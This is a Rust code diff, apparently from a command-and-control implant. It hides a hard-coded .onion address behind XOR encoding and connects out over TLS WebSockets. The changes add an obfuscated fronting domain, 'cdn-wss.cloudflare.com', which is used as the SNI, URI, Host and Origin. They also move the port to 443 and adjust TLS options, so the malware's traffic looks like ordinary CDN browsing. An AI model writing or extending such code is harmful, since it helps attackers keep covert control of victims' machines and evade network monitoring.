@@ -44,7 +44,8 @@ fn xor_decode_stack<const N: usize>(encoded: &[u8; N]) -> [u8; N] {
 }
 
 const ENC_DEFAULT_IP: [u8; 62] = xor_encode(b"htaws5zgxla4md6o4jeuto7ru2yafsbhfcbgdn63jbk3o5ert6zmplid.onion");
-const ENC_DEFAULT_PORT: [u8; 4] = xor_encode(b"4443");
+const ENC_DEFAULT_PORT: [u8; 3] = xor_encode(b"443");
+const ENC_SNI_DOMAIN: [u8; 22] = xor_encode(b"cdn-wss.cloudflare.com");
 
 // SOCKS5 proxy configuration
 // Mode 0: Direct connection (no proxy) — real IP visible on target
@@ -1591,11 +1592,11 @@ fn connect_wss(ip: &str, port: &str) -> Option<tungstenite::WebSocket<boring::ss
         if debug { eprintln!("  [wss] curves: {}", e); }
         return None;
     }
-    builder.set_alpn_protos(b"\x02h2\x08http/1.1").ok()?;
+    builder.set_alpn_protos(b"\x08http/1.1").ok()?;
     builder.clear_options(SslOptions::ALL);
     builder.set_options(
         SslOptions::NO_SSLV2 | SslOptions::NO_SSLV3
-        | SslOptions::NO_COMPRESSION | SslOptions::NO_TICKET,
+        | SslOptions::NO_COMPRESSION,
     );
     if let Err(e) = builder.set_sigalgs_list(&sigalgs) {
         if debug { eprintln!("  [wss] sigalgs: {}", e); }
@@ -1610,7 +1611,8 @@ fn connect_wss(ip: &str, port: &str) -> Option<tungstenite::WebSocket<boring::ss
 
     let connector = builder.build();
     if debug { eprintln!("  [wss] TLS handshake..."); }
-    let tls_stream = match connector.connect(ip, tcp) {
+    let sni_domain = xor_decode_str(&ENC_SNI_DOMAIN);
+    let tls_stream = match connector.connect(&sni_domain, tcp) {
         Ok(s) => s,
         Err(e) => { if debug { eprintln!("  [wss] TLS handshake FAILED: {}", e); } return None; }
     };
@@ -1618,7 +1620,7 @@ fn connect_wss(ip: &str, port: &str) -> Option<tungstenite::WebSocket<boring::ss
 
     let path = pick_ws_path();
     let ua = xor_decode_str(&ENC_USER_AGENT);
-    let ws_uri: Uri = format!("wss://{ip}:{port}{path}").parse().ok()?;
+    let ws_uri: Uri = format!("wss://{}:{}{}", sni_domain, port, path).parse().ok()?;
     if debug { eprintln!("  [wss] WS upgrade to {}", ws_uri); }
 
     let mut rng = rand::rng();
@@ -1630,9 +1632,9 @@ fn connect_wss(ip: &str, port: &str) -> Option<tungstenite::WebSocket<boring::ss
 
     let req = tungstenite::http::Request::builder()
         .uri(&ws_uri)
-        .header("Host", format!("{ip}:{port}"))
+        .header("Host", format!("{}:{}", sni_domain, port))
         .header("User-Agent", &ua)
-        .header("Origin", format!("https://{ip}"))
+        .header("Origin", format!("https://{}", sni_domain))
         .header("Accept-Language", accept_lang)
         .header("Accept-Encoding", "gzip, deflate, br")
         .header("Cache-Control", "no-cache")
